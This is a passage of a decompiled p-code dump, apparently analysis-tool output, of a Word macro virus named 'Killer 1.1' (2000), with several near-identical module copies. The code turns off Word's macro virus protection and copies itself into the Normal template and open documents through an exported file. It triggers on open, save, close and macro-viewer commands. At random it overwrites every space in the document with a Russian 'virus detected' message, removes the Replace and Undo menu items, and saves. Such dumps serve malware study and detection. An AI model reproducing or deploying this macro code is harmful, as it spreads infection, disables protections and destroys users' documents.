' 	MemStWith MatchWholeWord 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #66:
' 	EndWith 
' Line #67:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #68:
' 	LitStr 0x0015 "Undo VBA-Find.Execute"
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #69:
' 	LitStr 0x0011 "Repeat Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #70:
' 	LitStr 0x000A "Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub autonew())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall (Call) killer 0x0000 
' Line #77:
' 	EndSub 
' Macros/VBA/killer20 - 4763 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Killer 1.1 ©S&L 2000"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	VarDefn SluzhFile
' Line #2:
' 	FuncDefn (Sub killer())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #9:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #12:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #13:
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemSt New 
' Line #14:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #15:
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #16:
' 	Label out 
' Line #17:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	St c 
' Line #19:
' 	Ld c 
' 	LitDI2 0x0023 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) kill 0x0000 
' 	EndIf 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub HelpAbout())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall (Call) killer 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub FileSave())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	ArgsCall (Call) killer 0x0000 
' Line #29:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FileSaveAs())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #34:
' 	ArgsCall (Call) killer 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub AutoOpen())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) killer 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub AutoClose())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	ArgsCall (Call) killer 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub ToolsMacro())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) killer 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub ViewVBCode())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) killer 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub kill())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #55:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #56:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #57:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #58:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #59:
' 	LitStr 0x001B "На кампе обнаружен вирус!!!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #60:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #61:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #64:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #66:
' 	EndWith 
' Line #67:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #68:
' 	LitStr 0x0015 "Undo VBA-Find.Execute"
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #69:
' 	LitStr 0x0011 "Repeat Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #70:
' 	LitStr 0x000A "Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub autonew())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall (Call) killer 0x0000 
' Line #77:
' 	EndSub 
' Macros/VBA/killer21 - 5347 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Killer 1.1 ©S&L 2000"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	VarDefn SluzhFile
' Line #2:
' 	FuncDefn (Sub killer())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #9:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #12:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #13:
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemSt New 
' Line #14:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #15:
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #16:
' 	Label out 
' Line #17:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	St c 
' Line #19:
' 	Ld c 
' 	LitDI2 0x0023 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) kill 0x0000 
' 	EndIf 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub HelpAbout())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall (Call) killer 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub FileSave())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	ArgsCall (Call) killer 0x0000 
' Line #29:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FileSaveAs())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #34:
' 	ArgsCall (Call) killer 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub AutoOpen())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) killer 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub AutoClose())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	ArgsCall (Call) killer 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub ToolsMacro())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) killer 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub ViewVBCode())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) killer 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub kill())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #55:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #56:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #57:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #58:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #59:
' 	LitStr 0x001B "На кампе обнаружен вирус!!!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #60:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #61:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #64:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #66:
' 	EndWith 
' Line #67:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #68:
' 	LitStr 0x0015 "Undo VBA-Find.Execute"
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #69:
' 	LitStr 0x0011 "Repeat Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #70:
' 	LitStr 0x000A "Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub autonew())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall (Call) killer 0x0000 
' Line #77:
' 	EndSub 
' Macros/VBA/killer22 - 5347 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Killer 1.1 ©S&L 2000"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	VarDefn SluzhFile
' Line #2:
' 	FuncDefn (Sub killer())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #9:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #12:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #13:
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemSt New 
' Line #14:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #15:
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #16:
' 	Label out 
' Line #17:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	St c 
' Line #19:
' 	Ld c 
' 	LitDI2 0x0023 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) kill 0x0000 
' 	EndIf 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub HelpAbout())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall (Call) killer 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub FileSave())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	ArgsCall (Call) killer 0x0000 
' Line #29:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FileSaveAs())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #34:
' 	ArgsCall (Call) killer 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub AutoOpen())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) killer 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub AutoClose())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	ArgsCall (Call) killer 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub ToolsMacro())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) killer 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub ViewVBCode())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) killer 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub kill())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #55:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #56:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #57:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #58:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #59:
' 	LitStr 0x001B "На кампе обнаружен вирус!!!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #60:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #61:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #64:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #66:
' 	EndWith 
' Line #67:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #68:
' 	LitStr 0x0015 "Undo VBA-Find.Execute"
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #69:
' 	LitStr 0x0011 "Repeat Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #70:
' 	LitStr 0x000A "Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub autonew())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall (Call) killer 0x0000 
' Line #77:
' 	EndSub 
' Macros/VBA/killer23 - 5347 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Killer 1.1 ©S&L 2000"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	VarDefn SluzhFile
' Line #2:
' 	FuncDefn (Sub killer())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #9:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #11:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0006 "killer"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #12:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #13:
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemSt New 
' Line #14:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #15:
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt New 
' Line #16:
' 	Label out 
' Line #17:
' 	Dim 
' 	VarDefn c (As Integer)
' Line #18:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	St c 
' Line #19:
' 	Ld c 
' 	LitDI2 0x0023 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) kill 0x0000 
' 	EndIf 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub HelpAbout())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall (Call) killer 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub FileSave())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	ArgsCall (Call) killer 0x0000 
' Line #29:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #30:
' 	EndSub 
' Line #31:
' 	FuncDefn (Sub FileSaveAs())
' Line #32:
' 	OnError (Resume Next) 
' Line #33:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #34:
' 	ArgsCall (Call) killer 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Sub AutoOpen())
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' 	ArgsCall (Call) killer 0x0000 
' Line #39:
' 	EndSub 
' Line #40:
' 	FuncDefn (Sub AutoClose())
' Line #41:
' 	OnError (Resume Next) 
' Line #42:
' 	ArgsCall (Call) killer 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub ToolsMacro())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	ArgsCall (Call) killer 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' 	FuncDefn (Sub ViewVBCode())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' 	ArgsCall (Call) killer 0x0000 
' Line #51:
' 	EndSub 
' Line #52:
' 	FuncDefn (Sub kill())
' Line #53:
' 	OnError (Resume Next) 
' Line #54:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #55:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #56:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #57:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #58:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #59:
' 	LitStr 0x001B "На кампе обнаружен вирус!!!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #60:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #61:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #62:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #63:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #64:
' 	LitVarSpecial (True)
' 	MemStWith MatchWholeWord 
' Line #65:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #66:
' 	EndWith 
' Line #67:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #68:
' 	LitStr 0x0015 "Undo VBA-Find.Execute"
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #69:
' 	LitStr 0x0011 "Repeat Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #70:
' 	LitStr 0x000A "Replace..."
' 	LitStr 0x0004 "edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #72:
' 	EndSub 
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub autonew())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall (Call) killer 0x0000 
' Line #77:
' 	EndSub 
' Macros/VBA/killer24 - 4763 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0014 "Killer 1.1 ©S&L 2000"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	VarDefn SluzhFile
' Line #2:
' 	FuncDefn (Sub killer())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #9:
' 	LitStr 0x0016 "c:\windows\winnews.txt"
' 	LitStr 0x0006 "killer"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #10:
' 	LitVarSpecial (False)
